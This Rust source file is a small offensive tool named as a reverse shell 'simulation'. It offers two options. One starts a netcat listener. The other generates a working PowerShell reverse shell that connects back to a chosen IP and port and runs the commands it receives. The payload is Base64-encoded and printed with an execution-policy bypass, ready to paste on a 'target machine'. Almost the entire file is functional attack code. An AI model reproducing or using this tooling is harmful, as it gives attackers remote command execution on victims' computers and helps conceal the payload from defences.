use std::process::{Command, Stdio};
use std::io::{self, Write};
use std::net::IpAddr;

pub fn simulate_reverse_shell() {
    println!("Simulating reverse shell attack...");

    // Offer the user a choice
    println!("What would you like to do?");
    println!("1. Start a listener on a specific port");
    println!("2. Generate a PowerShell reverse shell payload");

    print!("Enter your choice (1/2): ");
    io::stdout().flush().unwrap();
    let mut choice = String::new();
    io::stdin().read_line(&mut choice).unwrap();

    match choice.trim() {
        "1" => {
            // Start a listener
            println!("Starting a listener...");
            print!("Enter the port to listen on: ");
            io::stdout().flush().unwrap();
            let mut port = String::new();
            io::stdin().read_line(&mut port).unwrap();

            // Validate port
            let port = match port.trim().parse::<u16>() {
                Ok(p) if (1..=65535).contains(&p) => p,
                _ => {
                    eprintln!("Invalid port. Please enter a number between 1 and 65535.");
                    return;
                }
            };

            println!(
                "Setting up a listener on port {}. Press Ctrl+C or type 'quit' to stop the listener.",
                port
            );

            let listener = Command::new("nc")
                .arg("-lvp")
                .arg(port.to_string())
                .stdin(Stdio::inherit())
                .stdout(Stdio::inherit())
                .spawn();

            match listener {
                Ok(mut child) => {
                    println!("Listening on port {}...", port);
                    let mut input = String::new();
                    loop {
                        io::stdin().read_line(&mut input).unwrap();
                        if input.trim().eq_ignore_ascii_case("quit") {
                            child.kill().expect("Failed to stop the listener.");
                            println!("Listener stopped.");
                            break;
                        }
                    }
                }
                Err(e) => eprintln!("Failed to start listener: {}", e),
            }
        }
        "2" => {
            // Generate the PowerShell payload
            println!("Generating PowerShell reverse shell payload...");

            print!("Enter the IP address to connect back to: ");
            io::stdout().flush().unwrap();
            let mut ip = String::new();
            io::stdin().read_line(&mut ip).unwrap();
            let ip = ip.trim();

            // Validate IP address
            if ip.parse::<IpAddr>().is_err() {
                eprintln!("Invalid IP address. Please enter a valid IPv4 address.");
                return;
            }

            print!("Enter the port to connect back to: ");
            io::stdout().flush().unwrap();
            let mut port = String::new();
            io::stdin().read_line(&mut port).unwrap();

            // Validate port
            let port = match port.trim().parse::<u16>() {
                Ok(p) if (1..=65535).contains(&p) => p,
                _ => {
                    eprintln!("Invalid port. Please enter a number between 1 and 65535.");
                    return;
                }
            };

            // Generate the PowerShell reverse shell command
            let ps_command = format!(
                "$callback = New-Object System.Net.Sockets.TCPClient(\"{}\",{});$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$callback.Close()",
                ip, port
            );

            // Determine PowerShell binary based on OS
            let shell_binary = if cfg!(target_os = "windows") {
                "powershell"
            } else {
                "pwsh"
            };

            // Encode the command using PowerShell
            let encoded_command = Command::new(shell_binary)
                .arg("-Command")
                .arg(format!(
                    "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('{}'))",
                    ps_command
                ))
                .output()
                .expect("Failed to encode the command in Base64");

            let encoded_command = String::from_utf8_lossy(&encoded_command.stdout).trim().to_string();

            // Print the PowerShell execution command
            println!("\nCopy and paste the following command into PowerShell on the target machine:");
            println!(
                "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {}",
                encoded_command
            );
        }
        _ => {
            println!("Invalid choice. Please select 1 or 2.");
        }
    }
}
